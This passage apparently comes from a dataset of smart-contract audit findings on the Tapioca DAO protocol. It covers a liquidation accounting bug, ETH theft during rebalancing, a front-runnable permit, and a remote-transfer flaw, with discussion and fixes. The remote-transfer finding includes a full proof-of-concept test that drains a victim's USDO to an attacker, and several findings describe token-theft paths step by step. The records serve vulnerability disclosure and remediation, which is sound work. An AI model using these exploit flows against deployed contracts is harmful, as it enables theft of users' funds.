0;\n        uint256 borrowShare = yieldBox.toShare(assetId, borrowAmount, true);\n\n        (uint256 returnedShare,) =\n            _swapCollateralWithAsset(collateralShare, _liquidatorReceiver, _liquidatorReceiverData);\n        if (returnedShare < borrowShare) revert AmountNotValid();\n\n        (uint256 feeShare, uint256 callerShare) = _extractLiquidationFees(returnedShare, borrowShare, callerReward);\n\n        IUsdo(address(asset)).burn(address(this), borrowAmount);\n\n        address[] memory _users = new address[](1);\n        _users[0] = user;\n        emit Liquidated(msg.sender, _users, callerShare, feeShare, borrowAmount, collateralShare);\n    }\n\n    function _updateBorrowAndCollateralShare(\n        address user,\n        uint256 maxBorrowPart,\n        uint256 minLiquidationBonus, // min liquidation bonus to accept (default 0)\n        uint256 _exchangeRate\n    ) private returns (uint256 borrowAmount, uint256 borrowPart, uint256 collateralShare) {\n        if (_exchangeRate == 0) revert ExchangeRateNotValid();\n\n        // get collateral amount in asset's value\n        uint256 collateralPartInAsset = (\n            yieldBox.toAmount(collateralId, userCollateralShare[user], false) * EXCHANGE_RATE_PRECISION\n        ) / _exchangeRate;\n\n        // compute closing factor (liquidatable amount)\n        uint256 borrowPartWithBonus =\n            computeClosingFactor(userBorrowPart[user], collateralPartInAsset, FEE_PRECISION_DECIMALS);\n\n        // limit liquidable amount before bonus to the current debt\n        uint256 userTotalBorrowAmount = totalBorrow.toElastic(userBorrowPart[user], true);\n        borrowPartWithBonus = borrowPartWithBonus > userTotalBorrowAmount ? userTotalBorrowAmount : borrowPartWithBonus;\n\n        // check the amount to be repaid versus liquidator supplied limit\n        borrowPartWithBonus = borrowPartWithBonus > maxBorrowPart ? maxBorrowPart : borrowPartWithBonus;\n        borrowAmount = borrowPartWithBonus;\n\n        // compute part units, preventing rounding dust when liquidation is full\n        borrowPart = borrowAmount == userTotalBorrowAmount\n            ? userBorrowPart[user]\n            : totalBorrow.toBase(borrowPartWithBonus, false);\n        if (borrowPart == 0) revert Solvent();\n\n        if (liquidationBonusAmount > 0) {\n            borrowPartWithBonus = borrowPartWithBonus + (borrowPartWithBonus * liquidationBonusAmount) / FEE_PRECISION;\n        }\n\n        if (collateralPartInAsset < borrowPartWithBonus) {\n            if (collateralPartInAsset <= userTotalBorrowAmount) {\n                revert BadDebt();\n            }\n            // If current debt is covered by collateral fully\n            // then there is some liquidation bonus,\n            // so liquidation can proceed if liquidator's minimum is met\n            if (minLiquidationBonus > 0) {\n                // `collateralPartInAsset > borrowAmount` as `borrowAmount <= userTotalBorrowAmount`\n                uint256 effectiveBonus = ((collateralPartInAsset - borrowAmount) * FEE_PRECISION) / borrowAmount;\n                if (effectiveBonus < minLiquidationBonus) {\n                    revert InsufficientLiquidationBonus();\n                }\n                collateralShare = userCollateralShare[user];\n            } else {\n                revert InsufficientLiquidationBonus();\n            }\n        } else {\n            collateralShare =\n                yieldBox.toShare(collateralId, (borrowPartWithBonus * _exchangeRate) / EXCHANGE_RATE_PRECISION, false);\n            if (collateralShare > userCollateralShare[user]) {\n                revert NotEnoughCollateral();\n            }\n        }\n\n      userBorrowPart[user] -= borrowPart;\n      userCollateralShare[user] -= collateralShare;\n    }\n```\n\nThe methods mentioned above update the user-specific variables `userBorrowPart[user]` and `userCollateralShare[user]` within the `_updateBorrowAndCollateralShare()` method. Additionally, the global variable `totalCollateralShare` is updated within the `_liquidateUser()` method.\nHowever, there's another crucial global variable, `totalBorrow`, which remains unaltered throughout the entire liquidation process.\nFailure to update `totalBorrow` during liquidation will result in incorrect subsequent loan-related calculations.\nNote: SGL Liquidation has the same issuesч```\n    function _liquidateUser(\n        address user,\n        uint256 maxBorrowPart,\n        IMarketLiquidatorReceiver _liquidatorReceiver,\n        bytes calldata _liquidatorReceiverData,\n        uint256 _exchangeRate,\n        uint256 minLiquidationBonus\n    ) private {\n        uint256 callerReward = _getCallerReward(user, _exchangeRate);\n\n// Remove the line below\n       (uint256 borrowAmount,, uint256 collateralShare) =\n// Add the line below\n       (uint256 borrowAmount,uint256 borrowPart, uint256 collateralShare) =\n            _updateBorrowAndCollateralShare(user, maxBorrowPart, minLiquidationBonus, _exchangeRate);\n        totalCollateralShare = totalCollateralShare > collateralShare ? totalCollateralShare // Remove the line below\n collateralShare : 0;\n// Add the line below\n       totalBorrow.elastic // Remove the line below\n= borrowAmount.toUint128();\n// Add the line below\n       totalBorrow.base // Remove the line below\n= borrowPart.toUint128();\n```\n\nDiscussion\nsherlock-admin4\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nthe totalBorrow should be updated; medium(9)\ncryptotechmaker\nFixed in https://github.com/Tapioca-DAO/Tapioca-bar/pull/354\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/354.чThe lack of an update to `totalBorrow` during liquidation leads to inaccuracies in subsequent loan-related calculations. For instance, this affects interest accumulation and the amount of interest due.\nCode Snippet\nTool used\nManual Review
All ETH can be stolen during rebalancing for `mTOFTs` that hold nativeчhighч"```\n    // compose stargate to swap ETH on the source to ETH on the destination\n    function swapETH(\n        uint16 _dstChainId,                         // destination Stargate chainId\n        address payable _refundAddress,             // refund additional messageFee to this address\n        bytes calldata _toAddress,                  // the receiver of the destination ETH\n        uint256 _amountLD,                          // the amount, in Local Decimals, to be swapped\n        uint256 _minAmountLD                        // the minimum amount accepted out on destination\n    ) external payable {\n        require(msg.value > _amountLD, ""Stargate: msg.value must be > _amountLD"");\n\n        // wrap the ETH into WETH\n        IStargateEthVault(stargateEthVault).deposit{value: _amountLD}();\n        IStargateEthVault(stargateEthVault).approve(address(stargateRouter), _amountLD);\n\n        // messageFee is the remainder of the msg.value after wrap\n        uint256 messageFee = msg.value - _amountLD;\n\n        // compose a stargate swap() using the WETH that was just wrapped\n        stargateRouter.swap{value: messageFee}(\n            _dstChainId,                        // destination Stargate chainId\n            poolId,                             // WETH Stargate poolId on source\n            poolId,                             // WETH Stargate poolId on destination\n            _refundAddress,                     // message refund address if overpaid\n            _amountLD,                          // the amount in Local Decimals to swap()\n            _minAmountLD,                       // the minimum amount swap()er would allow to get out (ie: slippage)\n            IStargateRouter.lzTxObj(0, 0, ""0x""),\n            _toAddress,                         // address on destination to send to\n      bytes("""")                           // empty payload, since sending to EOA\n        );\n    }\n```\n"ч"Rebalancing of ETH transfers the ETH to the destination `mTOFT` without calling `sgRecieve` which leaves the ETH hanging inside the `mTOFT` contract. This can be exploited to steal all the ETH.\nThe expected behaviour is ETH being received on the destination chain whereby `sgReceive` is called and ETH is deposited inside the `TOFTVault`.\nBy taking a closer look at the logic inside the `routerETH` contract we can see that the transfer is called with an empty payload:\n```\n    // compose stargate to swap ETH on the source to ETH on the destination\n    function swapETH(\n        uint16 _dstChainId,                         // destination Stargate chainId\n        address payable _refundAddress,             // refund additional messageFee to this address\n        bytes calldata _toAddress,                  // the receiver of the destination ETH\n        uint256 _amountLD,                          // the amount, in Local Decimals, to be swapped\n        uint256 _minAmountLD                        // the minimum amount accepted out on destination\n    ) external payable {\n        require(msg.value > _amountLD, ""Stargate: msg.value must be > _amountLD"");\n\n        // wrap the ETH into WETH\n        IStargateEthVault(stargateEthVault).deposit{value: _amountLD}();\n        IStargateEthVault(stargateEthVault).approve(address(stargateRouter), _amountLD);\n\n        // messageFee is the remainder of the msg.value after wrap\n        uint256 messageFee = msg.value - _amountLD;\n\n        // compose a stargate swap() using the WETH that was just wrapped\n        stargateRouter.swap{value: messageFee}(\n            _dstChainId,                        // destination Stargate chainId\n            poolId,                             // WETH Stargate poolId on source\n            poolId,                             // WETH Stargate poolId on destination\n            _refundAddress,                     // message refund address if overpaid\n            _amountLD,                          // the amount in Local Decimals to swap()\n            _minAmountLD,                       // the minimum amount swap()er would allow to get out (ie: slippage)\n            IStargateRouter.lzTxObj(0, 0, ""0x""),\n            _toAddress,                         // address on destination to send to\n      bytes("""")                           // empty payload, since sending to EOA\n        );\n    }\n```\n\nNotice the comment:\nempty payload, since sending to EOA\nSo `routerETH` after depositing ETH in `StargateEthVault` calls the regular `StargateRouter` but with an empty payload.\nNext, let's see how the receiving logic works.\nAs Stargate is just another application built on top of LayerZero the receiving starts inside the `Bridge::lzReceive` function. As the type of transfer is `TYPE_SWAP_REMOTE` the `router::swapRemote` is called:\n```\nfunction lzReceive(\n    uint16 _srcChainId,\n    bytes memory _srcAddress,\n    uint64 _nonce,\n    bytes memory _payload\n) external override {\n\n\n    if (functionType == TYPE_SWAP_REMOTE) {\n        (\n            ,\n            uint256 srcPoolId,\n            uint256 dstPoolId,\n            uint256 dstGasForCall,\n            Pool.CreditObj memory c,\n            Pool.SwapObj memory s,\n            bytes memory to,\n            bytes memory payload\n        ) = abi.decode(_payload, (uint8, uint256, uint256, uint256, Pool.CreditObj, Pool.SwapObj, bytes, bytes));\n        address toAddress;\n        assembly {\n            toAddress := mload(add(to, 20))\n        }\n        router.creditChainPath(_srcChainId, srcPoolId, dstPoolId, c);\n  router.swapRemote(_srcChainId, _srcAddress, _nonce, srcPoolId, dstPoolId, dstGasForCall, toAddress, s, payload);\n```\n\n`Router:swapRemote` has two responsibilities:\nFirst it calls `pool::swapRemote` that transfers the actual tokens to the destination address. In this case this is the `mTOFT` contract.\nSecond it will call `IStargateReceiver(mTOFTAddress)::sgReceive` but only if the payload is not empty.\n```\n function _swapRemote(\n    uint16 _srcChainId,\n    bytes memory _srcAddress,\n    uint256 _nonce,\n    uint256 _srcPoolId,\n    uint256 _dstPoolId,\n    uint256 _dstGasForCall,\n    address _to,\n    Pool.SwapObj memory _s,\n    bytes memory _payload\n) internal {\n    Pool pool = _getPool(_dstPoolId);\n    // first try catch the swap remote\n    try pool.swapRemote(_srcChainId, _srcPoolId, _to, _s) returns (uint256 amountLD) {\n   if (_payload.length > 0) {\n            // then try catch the external contract call\n      try IStargateReceiver(_to).sgReceive{gas: _dstGasForCall}(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _payload) {\n                // do nothing\n            } catch (bytes memory reason) {\n                cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(pool.token(), amountLD, _to, _payload);\n                emit CachedSwapSaved(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _to, _payload, reason);\n            }\n        }\n    } catch {\n        revertLookup[_srcChainId][_srcAddress][_nonce] = abi.encode(\n            TYPE_SWAP_REMOTE_RETRY,\n            _srcPoolId,\n            _dstPoolId,\n            _dstGasForCall,\n            _to,\n            _s,\n            _payload\n        );\n        emit Revert(TYPE_SWAP_REMOTE_RETRY, _srcChainId, _srcAddress, _nonce);\n    }\n}\n```\n\nAs payload is empty in case of using the `routerETH` contract the `sgReceive` function is never called. This means that the ETH is left sitting inside the `mTOFT` contract.\nThere are several ways of stealing the balance of `mTOFT`. An attacker can use the `mTOFT::sendPacket` function and utilize the `lzNativeGasDrop` option to airdrop the balance of `mTOFT` to attacker's address on the destination chain: https://docs.layerzero.network/contracts/options#lznativedrop-option\nAll he has to do is specify the option type `lzNativeDrop` inside the `_lsSendParams.extraOptions` and the cost of calling `_lzSend` plus the airdrop amount will be paid out from the balance of `mTOFT`.\nAs this is a complete theft of the rebalanced amount I'm rating this as a critical vulnerability."ч```\nfunction swapETHAndCall(\n        uint16 _dstChainId, // destination Stargate chainId\n        address payable _refundAddress, // refund additional messageFee to this address\n        bytes calldata _toAddress, // the receiver of the destination ETH\n        SwapAmount memory _swapAmount, // the amount and the minimum swap amount\n        IStargateRouter.lzTxObj memory _lzTxParams, // the LZ tx params\n        bytes calldata _payload // the payload to send to the destination\n    ) external payable {\n```\n\nThe contract on Ethereum can be found at: https://www.codeslaw.app/contracts/ethereum/0xb1b2eeF380f21747944f46d28f683cD1FBB4d03c. And the Stargate docs specify its deployment address on all the chains where ETH is supported: https://stargateprotocol.gitbook.io/stargate/developers/contract-addresses/mainnet\nDiscussion\ncryptotechmaker\nWe had a chat with LZ about this a while ago and yes, the router cannot be used in this case. However the contract we're going to use is https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code and it respects the IStargateRouter interface\nwindhustler\nThe contract you referenced above, i.e. `StargateComposer` doesn't have the `swapETH` interface:\n```\nfunction swapETH(uint16 _dstChainId, address payable _refundAddress, bytes calldata _toAddress, uint256 _amountLD, uint256 _minAmountLD) external;\n```\n\nYour options are to refactor this to either use the `*RouterETH: swapETHAndCall` or the `StargateComposer::swapETHAndCall` function.\ncryptotechmaker\nGood catch @windhustler\ncryptotechmaker\nChanged the status to 'Will fix'\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/174; https://github.com/Tapioca-DAO/tapioca-periph/pull/198.чAll ETH can be stolen during rebalancing for mTOFTs that hold native tokens.\nCode Snippet\nTool used\nManual Review
exerciseOptionsReceiver() Lack of Ownership Check for oTAP, Allowing Anyone to Use oTAPTokenIDчhighч```\n    function exerciseOptionsReceiver(address srcChainSender, bytes memory _data) public payable {\n// rest of code\n            ITapiocaOptionBroker(_options.target).exerciseOption(\n              _options.oTAPTokenID,\n                address(this), //payment token\n                _options.tapAmount\n            );\n            _approve(address(this), address(pearlmit), 0);\n            uint256 bAfter = balanceOf(address(this));\n\n            // Refund if less was used.\n            if (bBefore > bAfter) {\n                uint256 diff = bBefore - bAfter;\n                if (diff < _options.paymentTokenAmount) {\n                    IERC20(address(this)).safeTransfer(_options.from, _options.paymentTokenAmount - diff);\n                }\n            }\n// rest of code\n```\nчIn UsdoOptionReceiverModule.exerciseOptionsReceiver(): For this method to execute successfully, the `owner` of the `oTAPTokenID` needs to approve it to `address(usdo)`. Once approved, anyone can front-run execute `exerciseOptionsReceiver()` and utilize this authorization.\nIn `USDO.lzCompose()`, it is possible to specify `_msgType == MSG_TAP_EXERCISE` to execute `USDO.exerciseOptionsReceiver()` across chains.\n```\n    function exerciseOptionsReceiver(address srcChainSender, bytes memory _data) public payable {\n// rest of code\n            ITapiocaOptionBroker(_options.target).exerciseOption(\n              _options.oTAPTokenID,\n                address(this), //payment token\n                _options.tapAmount\n            );\n            _approve(address(this), address(pearlmit), 0);\n            uint256 bAfter = balanceOf(address(this));\n\n            // Refund if less was used.\n            if (bBefore > bAfter) {\n                uint256 diff = bBefore - bAfter;\n                if (diff < _options.paymentTokenAmount) {\n                    IERC20(address(this)).safeTransfer(_options.from, _options.paymentTokenAmount - diff);\n                }\n            }\n// rest of code\n```\n\nFor this method to succeed, USDO must first obtain approve for the `oTAPTokenID`.\nExample: The owner of `oTAPTokenID` is Alice.\nalice in A chain execute lzSend(dstEid = B) with\ncomposeMsg = [oTAP.permit(usdo,oTAPTokenID,v,r,s) 2.exerciseOptionsReceiver(oTAPTokenID,_options.from=alice) 3. oTAP.revokePermit(oTAPTokenID)]\nin chain B USDO.lzCompose() will\nexecute oTAP.permit(usdo,oTAPTokenID)\nexerciseOptionsReceiver(srcChainSender=alice,_options.from=alice,oTAPTokenID )\noTAP.revokePermit(oTAPTokenID)\nThe signature of `oTAP.permit` is public, allowing anyone to use it.\nNote: if alice call approve(oTAPTokenID,usdo) in chain B without signature, but The same result\nThis opens up the possibility for malicious users to front-run use this signature. Let's consider an example with Bob:\nBob in Chain A uses Alice's signature (v, r, s):\ncomposeMsg = [oTAP.permit(usdo, oTAPTokenID, v, r, s), exerciseOptionsReceiver(oTAPTokenID, _options.from=bob)]-----> (Note: `_options.from` should be set to Bob.)\nIn Chain B, when executing `USDO.lzCompose(dstEid = B)`, the following actions occur:\nExecute `oTAP.permit(usdo, oTAPTokenID)`\nExecute `exerciseOptionsReceiver(srcChainSender=bob, _options.from=bob, oTAPTokenID)`\nAs a result, Bob gains unconditional access to this `oTAPTokenID`.\nIt is advisable to check the ownership of `oTAPTokenID` is `_options.from` before executing `ITapiocaOptionBroker(_options.target).exerciseOption()`.ч"
Wrong parameter in remote transfer makes it possible to steal all USDO balance from usersчhighч```\n// SPDX-License-Identifier: LZBL-1.2\n\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes message;\n    bytes options; \n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\ncontract MockEndpointV2  {\n\n  \n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable  returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    /// @dev the Oapp sends the lzCompose message to the endpoint\n    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function\n    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time\n    /// @dev authenticated by the msg.sender\n    /// @param _to the address which will receive the composed message\n    /// @param _guid the message guid\n    /// @param _message the message\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n         // DO NOTHING\n        \n    }\n  \n}\n```\nч"Setting a wrong parameter when performing remote transfers enables an attack flow where USDO can be stolen from users.\nThe following bug describes a way to leverage Tapioca’s remote transfers in order to drain any user’s USDO balance. Before diving into the issue, a bit of background regarding compose calls is required in order to properly understand the attack.\nTapioca allows users to leverage LayerZero’s compose calls, which enable complex interactions between messages sent across chains. Compose messages are always preceded by a sender address in order for the destination chain to understand who the sender of the compose message is. When the compose message is received, `TapiocaOmnichainReceiver.lzCompose()` will decode the compose message, extract the `srcChainSender_` and trigger the internal `_lzCompose()` call with the decoded `srcChainSender_` as the sender:\nOne of the type of compose calls supported in tapioca are remote transfers. When the internal `_lzCompose()` is triggered, users who specify a msgType equal to `MSG_REMOTE_TRANSFER` will make the `_remoteTransferReceiver()` internal call be executed:\nRemote transfers allow users to burn tokens in one chain and mint them in another chain by executing a recursive `_lzSend()` call. In order to burn the tokens, they will first be transferred from an arbitrary owner set by the function caller via the `_internalTransferWithAllowance()` function.\nAfter transferring the tokens via `_internalTransferWithAllowance()`, `_internalRemoteTransferSendPacket()` will be triggered, which is the function that will actually burn the tokens and execute the recursive `_lzSend()` call:\nAs we can see, the `_lzSend()` call performed inside `_internalRemoteTransferSendPacket()` allows to trigger the remote call with another compose message (built using the `_buildOFTMsgAndOptionsMemory()` function). If there is an actual `_composeMsg` to be appended, the sender of such message will be set to the `_internalRemoteTransferSendPacket()` function’s `_srcChainSender` parameter.\nThe problem is that when `_internalRemoteTransferSendPacket()` is called, the parameter passed as the source chain sender is set to the arbitrary owner address supplied by the caller in the initial compose call, instead of the actual source chain sender:\nThis makes it possible for an attacker to create an attack vector that allows to drain any user’s USDO balance. The attack path is as follows:\nExecute a remote call from chain A to chain B. This call has a compose message that will be triggered in chain B.\nThe remote transfer message will set the arbitrary `owner` to any victim’s address. It is important to also set the amount to be transferred in this first compose call to 0 so that the `attacker` can bypass the allowance check performed inside the `_remoteTransferReceiver()` call.\nWhen the compose call gets executed, a second packed compose message will be built and triggered inside `_internalRemoteTransferSendPacket()`. This second compose message will be sent from chain B to chain A, and the source chain sender will be set to the arbitrary `owner` address that the `attacker` wants to drain due to the incorrect parameter being passed. It will also be a remote transfer action.\nWhen chain A receives the compose message, a third compose will be triggered. This third compose is where the token transfers will take place. Inside the `_lzReceive()` triggered in chain A, the composed message will instruct to transfer and burn a certain amount of tokens (selected by the `attacker` when crafting the attack). Because the source chain sender is the victim address and the `owner` specified is also the victim, the `_internalTransferWithAllowance()` executed in chain A will not check for allowances because the `owner` and the spender are the same address (the victim’s address). This will burn the attacker’s desired amount from the victim’s wallet.\nFinally, a last `_lzSend()` will be triggered to chain B, where the burnt tokens in chain A will be minted. Because the compose calls allow to set a specific recipient address, the receiver of the minted tokens will be the `attacker`.\nAs a summary: the attack allows to combine several compose calls recursively so that an attacker can burn victim’s tokens in Chain A, and mint them in chain B to a desired address. The following diagram summarizes the attack for clarity:\n\nThe following proof of concept illustrates how the mentioned attack can take place. In order to execute the PoC, the following steps must be performed:\n```\n// SPDX-License-Identifier: LZBL-1.2\n\npragma solidity ^0.8.20;\n\nstruct MessagingReceipt {\n    bytes32 guid;\n    uint64 nonce;\n    MessagingFee fee;\n}\n\nstruct MessagingParams {\n    uint32 dstEid;\n    bytes32 receiver;\n    bytes message;\n    bytes options; \n    bool payInLzToken;\n}\n\nstruct MessagingFee {\n    uint256 nativeFee;\n    uint256 lzTokenFee;\n}\ncontract MockEndpointV2  {\n\n  \n    function send(\n        MessagingParams calldata _params,\n        address _refundAddress\n    ) external payable  returns (MessagingReceipt memory receipt) {\n        // DO NOTHING\n    }\n\n    /// @dev the Oapp sends the lzCompose message to the endpoint\n    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function\n    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time\n    /// @dev authenticated by the msg.sender\n    /// @param _to the address which will receive the composed message\n    /// @param _guid the message guid\n    /// @param _message the message\n    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {\n         // DO NOTHING\n        \n    }\n  \n}\n```\n\n```\nfunction testVuln_stealUSDOFromATargetUserDueToWrongParameter() public {\n\n        // Change configured enpoints\n\n        endpoints[aEid] = address(mockEndpointV2A);\n        endpoints[bEid] = address(mockEndpointV2B);\n\n        aUsdo.setEndpoint(address(mockEndpointV2A));\n        bUsdo.setEndpoint(address(mockEndpointV2B));\n\n        \n        \n        deal(address(aUsdo), makeAddr(""victim""), 100 ether);\n\n        ////////////////////////////////////////////////////////\n        //                 PREPARE MESSAGES                   //\n        ////////////////////////////////////////////////////////\n\n        // FINAL MESSAGE    A ---> B                  \n\n        SendParam memory sendParamAToBVictim = SendParam({\n            dstEid: bEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n            amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal\n            minAmountLD: 100 ether,\n            extraOptions: bytes(""""),\n            composeMsg: bytes(""""),\n            oftCmd: bytes("""")\n        });  \n        MessagingFee memory feeAToBVictim = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToBVictim = LZSendParam({\n            sendParam: sendParamAToBVictim,\n            fee: feeAToBVictim,\n            extraOptions: bytes(""""),\n            refundAddress: makeAddr(""attacker"")\n        });\n\n        RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({\n            owner: makeAddr(""victim""), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain\n            composeMsg: bytes(""""),\n            lzSendParam: lzSendParamAToBVictim\n        });\n\n        uint16 index; // needed to bypass Solidity's encoding literal error\n        // Create Toe Compose message for the victim\n        bytes memory toeComposeMsgVictim = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)\n            index, // index\n            abi.encode(remoteTransferMsgVictim), // message\n            bytes("""") // next message\n        );\n\n        // SECOND MESSAGE     B ---> A                 \n\n        SendParam memory sendParamBToA = SendParam({\n            dstEid: aEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n            amountLD: 0, // IMPORTANT: This must be set to 0 to bypass the allowance check performed inside `_remoteTransferReceiver()`\n            minAmountLD: 0,\n            extraOptions: bytes(""""),\n            composeMsg: bytes(""""),\n            oftCmd: bytes("""")\n        });  \n        MessagingFee memory feeBToA = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamBToA = LZSendParam({\n            sendParam: sendParamBToA,\n            fee: feeBToA,\n            extraOptions: bytes(""""),\n            refundAddress: makeAddr(""attacker"")\n        });\n\n        // Create remote transfer message\n        RemoteTransferMsg memory remoteTransferMsg = RemoteTransferMsg({\n            owner: makeAddr(""victim""), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain\n            composeMsg: toeComposeMsgVictim,\n            lzSendParam: lzSendParamBToA\n        });\n\n        // Create Toe Compose message\n        bytes memory toeComposeMsg = abi.encodePacked(\n            PT_REMOTE_TRANSFER, // msgType\n            uint16(abi.encode(remoteTransferMsg).length), // message length\n            index, // index\n            abi.encode(remoteTransferMsg),\n            bytes("""") // next message\n        );\n         \n        // INITIAL MESSAGE       A ---> B                      \n\n        // Create `_lzSendParam` parameter for `sendPacket()`\n        SendParam memory sendParamAToB = SendParam({\n            dstEid: bEid,\n            to: OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n            amountLD: 0,\n            minAmountLD: 0,\n            extraOptions: bytes(""""),\n            composeMsg: bytes(""""),\n            oftCmd: bytes("""")\n        });  \n        MessagingFee memory feeAToB = MessagingFee({\n            nativeFee: 0,\n            lzTokenFee: 0\n        });\n        \n        LZSendParam memory lzSendParamAToB = LZSendParam({\n            sendParam: sendParamAToB,\n            fee: feeAToB,\n            extraOptions: bytes(""""),\n            refundAddress: makeAddr(""attacker"")\n        });\n\n        vm.startPrank(makeAddr(""attacker""));\n        aUsdo.sendPacket(lzSendParamAToB, toeComposeMsg);\n\n        // EXECUTE ATTACK\n\n        // Execute first lzReceive() --> receive message in chain B\n    \n        vm.startPrank(endpoints[bEid]);\n        UsdoReceiver(address(bUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                sendParamAToB.to,\n                 index,  // amount (use an initialized 0 variable due to Solidity restrictions)\n                 OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n                toeComposeMsg\n            ), // message\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n\n        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.\n        // This triggers a message back to chain A, in which the srcChainSender will be set as the victim inside the\n        // composed message due to the wrong parameter passed\n        UsdoReceiver(address(bUsdo)).lzCompose(\n            address(bUsdo), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(aUsdo)), toeComposeMsg), // message\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n\n        vm.startPrank(endpoints[aEid]);\n\n        // Chain A: message is received, internally a compose flow is retriggered.\n        UsdoReceiver(address(aUsdo)).lzReceive(\n            Origin({sender: OFTMsgCodec.addressToBytes32(address(bUsdo)), srcEid: bEid, nonce: 0}), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                sendParamAToB.to,\n                 index,  // amount\n                 OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n                toeComposeMsgVictim\n            ), // message\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n\n        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.\n        // At this point, the srcChainSender is the victim (as set in the previous lzCompose) because of the wrong parameter (the `expectEmit` verifies it).\n        // The `owner` specified for the remote transfer is also the victim, so the allowance check is bypassed because `owner` == `srcChainSender`.\n        // This allows the tokens to be burnt, and a final message is triggered to the destination chain\n        UsdoReceiver(address(aUsdo)).lzCompose(\n            address(aUsdo), \n            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(makeAddr(""victim""))), toeComposeMsgVictim), // message (srcChainSender becomes victim because of wrong parameter set)\n            address(0), // executor (not used)\n            bytes("""") // extra data (not used)\n        );\n\n        // Back to chain B. Finally, the burnt tokens from the victim in chain A get minted in chain B with the attacker set as the destination\n        {\n            uint64 tokenAmountSD = usdoHelper.toSD(100 ether, bUsdo.decimalConversionRate());\n            \n            vm.startPrank(endpoints[bEid]);\n            UsdoReceiver(address(bUsdo)).lzReceive(\n                Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), \n                OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)\n                abi.encodePacked( // same as _buildOFTMsgAndOptions()\n                   OFTMsgCodec.addressToBytes32(makeAddr(""attacker"")),\n                    tokenAmountSD\n                ), // message\n                address(0), // executor (not used)\n                bytes("""") // extra data (not used)\n            );\n\n        }\n\n        // Finished: victim gets drained, attacker obtains balance of victim\n        assertEq(bUsdo.balanceOf(makeAddr(""victim"")), 0);\n        assertEq(bUsdo.balanceOf(makeAddr(""attacker"")), 100 ether);\n          \n    } \n```\n\nRun the poc with the following command: `forge test --mt testVuln_stealUSDOFromATargetUserDueToWrongParameter`\nThe proof of concept shows how in the end, the victim’s `aUsdo` balance will become 0, while all the `bUsdo` in chain B will be minted to the attacker."чChange the parameter passed in the `_internalRemoteransferSendPacket()` call so that the sender in the compose call built inside it is actually the real source chain sender. This will make it be kept along all the possible recursive calls that might take place:\n```\nfunction _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {\n        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);\n\n        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.\n        _internalTransferWithAllowance(\n            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD\n        );  \n          \n        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.\n        _internalRemoteTransferSendPacket(\n// Remove the line below\n            remoteTransferMsg_.owner,\n// Add the line below\n           _srcChainSender\n            remoteTransferMsg_.lzSendParam, \n            remoteTransferMsg_.composeMsg \n        ); \n      \n        emit RemoteTransferReceived(\n            remoteTransferMsg_.owner,\n            remoteTransferMsg_.lzSendParam.sendParam.dstEid,\n            